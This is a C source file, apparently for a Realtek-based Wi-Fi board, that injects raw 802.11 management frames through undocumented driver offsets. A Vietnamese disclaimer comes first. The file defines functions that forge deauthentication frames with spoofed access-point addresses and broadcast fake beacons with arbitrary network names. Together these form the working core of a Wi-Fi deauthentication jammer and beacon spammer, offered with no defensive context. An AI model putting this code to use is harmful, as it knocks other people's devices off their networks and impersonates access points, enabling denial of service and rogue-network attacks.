#include "wifi_cust_tx.h"






/*Từ chối trách nhiệm

Kho lưu trữ này được cung cấp "nguyên trạng" (as is), không có bất kỳ bảo đảm nào, dù rõ ràng hay ngụ ý, bao gồm nhưng không giới hạn ở các bảo đảm về tính thương mại, sự phù hợp cho một mục đích cụ thể hoặc không vi phạm quyền lợi. 
Trong mọi trường hợp, tác giả hoặc chủ sở hữu bản quyền sẽ không chịu trách nhiệm với bất kỳ yêu cầu, thiệt hại hoặc trách nhiệm nào khác, dù trong hợp đồng, lỗi dân sự hay cách khác, phát sinh từ, liên quan đến, hoặc kết nối với phần mềm hoặc việc sử dụng, khai thác phần mềm.

Việc sử dụng kho lưu trữ này và nội dung bên trong là hoàn toàn tự nguyện và chịu rủi ro từ phía người dùng. Tác giả không đảm bảo tính chính xác, đáng tin cậy hoặc đầy đủ của bất kỳ thông tin nào được cung cấp trong kho lưu trữ này.

bằng việc sử dụng kho lưu trữ này, bạn đồng ý với các điều khoản trên và xác nhận rằng bạn tự chịu trách nhiệm tuân thủ mọi quy định pháp luật hoặc quy tắc có liên quan*/








void wifi_tx_raw_frame(void* frame, size_t length) {
  void *ptr = (void *)**(uint32_t **)(rltk_wlan_info + 0x10);
  void *frame_control = alloc_mgtxmitframe(ptr + 0xae0);

  if (frame_control != 0) {
    update_mgntframe_attrib(ptr, frame_control + 8);
    memset((void *)*(uint32_t *)(frame_control + 0x80), 0, 0x68);
    uint8_t *frame_data = (uint8_t *)*(uint32_t *)(frame_control + 0x80) + 0x28;
    memcpy(frame_data, frame, length);
    *(uint32_t *)(frame_control + 0x14) = length;
    *(uint32_t *)(frame_control + 0x18) = length;
    dump_mgntframe(ptr, frame_control);
  }
}


void wifi_tx_deauth_frame(void* src_mac, void* dst_mac, uint16_t reason) {
  DeauthFrame frame;
  memcpy(&frame.source, src_mac, 6);
  memcpy(&frame.access_point, src_mac, 6);
  memcpy(&frame.destination, dst_mac, 6);
  frame.reason = reason;
  wifi_tx_raw_frame(&frame, sizeof(DeauthFrame));
}

void wifi_tx_beacon_frame(void* src_mac, void* dst_mac, const char *ssid) {
  BeaconFrame frame;
  memcpy(&frame.source, src_mac, 6);
  memcpy(&frame.access_point, src_mac, 6);
  memcpy(&frame.destination, dst_mac, 6);
  for (size_t i = 0; ssid[i] != '\0'; i++) {
    frame.ssid[i] = ssid[i];
    frame.ssid_length++;
  }
  wifi_tx_raw_frame(&frame, 38 + frame.ssid_length);
}